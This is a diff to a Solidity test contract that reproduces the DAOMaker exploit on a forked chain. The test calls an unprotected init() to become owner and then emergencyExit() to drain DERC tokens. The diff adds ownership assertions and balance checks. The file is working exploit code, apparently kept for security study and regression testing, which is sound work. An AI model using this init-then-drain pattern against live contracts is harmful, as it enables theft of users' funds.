@@ -10,6 +10,7 @@ import {TokenBalanceTracker} from '../../modules/TokenBalanceTracker.sol';
 interface DAOMaker {
     function init(uint256 _start, uint256[] calldata _releasePeriods, uint256[] calldata _releaseDate, address _token) external;
     function emergencyExit(address receiver) external;
+    function owner() external view returns(address);
 }
 
 contract Exploit_DAOMaker is TestHarness, TokenBalanceTracker {
@@ -26,8 +27,9 @@ contract Exploit_DAOMaker is TestHarness, TokenBalanceTracker {
 
     function test_attack() external {
         console.log('------- STEP 0: INITIAL BALANCE -------');
-        logBalances(attacker);
-        console.log('\n');
+        logBalances(address(this));
+
+        uint256 balanceBefore = derc.balanceOf(address(this));
 
         console.log('------- STEP 1: INITIALIZATION -------');
         uint256 initBlock = block.number;
@@ -40,22 +42,23 @@ contract Exploit_DAOMaker is TestHarness, TokenBalanceTracker {
         uint256[] memory releasePercents = new uint256[](1);
         releasePercents[0] = 10000;
 
-        cheat.prank(attacker);
         daomaker.init(start, releasePeriods, releasePercents, address(derc));
+        console.log(daomaker.owner());
+        console.log(address(this));
        
         console.log('Current Block:', initBlock);
-        logBalances(attacker);
+        logBalances(address(this));
         console.log('\n');
+        assertEq(daomaker.owner(), address(this));
         
         console.log('------- STEP 2: DERC EXIT -------');
-        cheat.rollFork(initBlock + 1);
-        console.log('Current Block:', block.number);
 
-        cheat.prank(attacker);
-        daomaker.emergencyExit(attacker);
+        assertEq(daomaker.owner(), address(this));
+        daomaker.emergencyExit(address(this));
 
-        logBalances(attacker);
-
+        uint256 balanceAfter = derc.balanceOf(address(this));
+        assertGe(balanceAfter, balanceBefore);
+        logBalances(msg.sender);
     }
 
 
